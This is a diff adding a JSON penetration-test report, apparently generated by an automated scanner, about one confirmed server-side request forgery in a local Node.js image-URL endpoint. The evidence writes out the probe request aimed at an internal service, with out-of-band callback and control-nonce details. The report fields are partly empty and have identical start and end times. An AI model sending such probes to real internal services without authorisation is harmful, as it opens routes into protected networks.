@@ -1,0 +1,65 @@
+{
+  "id": "a92aa3e0-2ee6-454e-aa80-b7212a989a06",
+  "engagement_name": "Cross-service B1 arm b",
+  "target_scope": [
+    "localhost",
+    "127.0.0.1",
+    "host.docker.internal",
+    "internal-metadata"
+  ],
+  "test_start": "2026-07-23T16:34:11.978614Z",
+  "test_end": "2026-07-23T16:34:11.978614Z",
+  "generated_at": "2026-07-23T16:34:11.979489Z",
+  "executive_summary": {
+    "overview": "Penetration test of localhost, 127.0.0.1, host.docker.internal, internal-metadata. 1 findings identified.",
+    "risk_rating": "High",
+    "critical_count": 0,
+    "high_count": 1,
+    "medium_count": 0,
+    "low_count": 0,
+    "info_count": 0,
+    "key_findings": [],
+    "recommendations": []
+  },
+  "hosts": [],
+  "findings": [
+    {
+      "id": "9bc8fa00-caa3-4513-9b39-fb0e9fcac35a",
+      "title": "Cross-Service Server-Side Request Forgery (SSRF) \u2014 A reaches internal service B \u2014 imageUrl",
+      "description": "Technique: WSTG-INPV-19 (SSRF) \u2014 cross-service reach confirmed out-of-band (P6) at a collaborator co-located with B. Parameter: imageUrl.",
+      "severity": "high",
+      "status": "confirmed",
+      "target": "http://localhost:3000/profile/image/url",
+      "evidence": [
+        "Request: Cross-service SSRF http://localhost:3000/profile/image/url \u2014 imageUrl=http://host.docker.internal:18082/spgizgdz4k3s7k6nmbruh6kqne (targeting in-scope internal service B http://host.docker.internal:18082/)",
+        "Response: out-of-band callback bearing the probe nonce recorded AT B (http from 127.0.0.1) \u2014 A\u2192B reach confirmed",
+        "cross_service=A(http://localhost:3000/profile/image/url) \u2192 B(http://host.docker.internal:18082/) topology_source=recon reachability_grade=cross_service_topology",
+        "confirmation=P6 out-of-band callback recorded AT B (collaborator co-located with B) \u2014 proves A REACHES B, not merely that A egresses somewhere",
+        "confirmation=P6 target=http://host.docker.internal:18082/spgizgdz4k3s7k6nmbruh6kqne status=None",
+        "outbound_probe: POST http://localhost:3000/profile/image/url \u2014 imageUrl=http://host.docker.internal:18082/spgizgdz4k3s7k6nmbruh6kqne",
+        "callback_nonce='spgizgdz4k3s7k6nmbruh6kqne' (carried only in the one outbound probe; control_bore_it=False)",
+        "confirming_excerpt: inbound callback: proto=http src=127.0.0.1 host=host.docker.internal:18082 path=/spgizgdz4k3s7k6nmbruh6kqne received_at=1784824451.944",
+        "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-23T16:34:11.974380Z",
+      "validated_at": null,
+      "discovery_provenance": {
+        "technology_key": "node-js",
+        "observed_version": "",
+        "sink_shape_id": "js.http_egress",
+        "primitive_class": "egress_fetch",
+        "primitive_id": "egress_fetch.java_openconnection",
+        "confirmation_primitive": "P6",
+        "reachability_grade": "cross_service_topology",
+        "gating_config": "ProxyBaseUrl"
+      }
+    }
+  ],
+  "research_leads": [],
+  "methodology": "",
+  "appendices": {}
+}
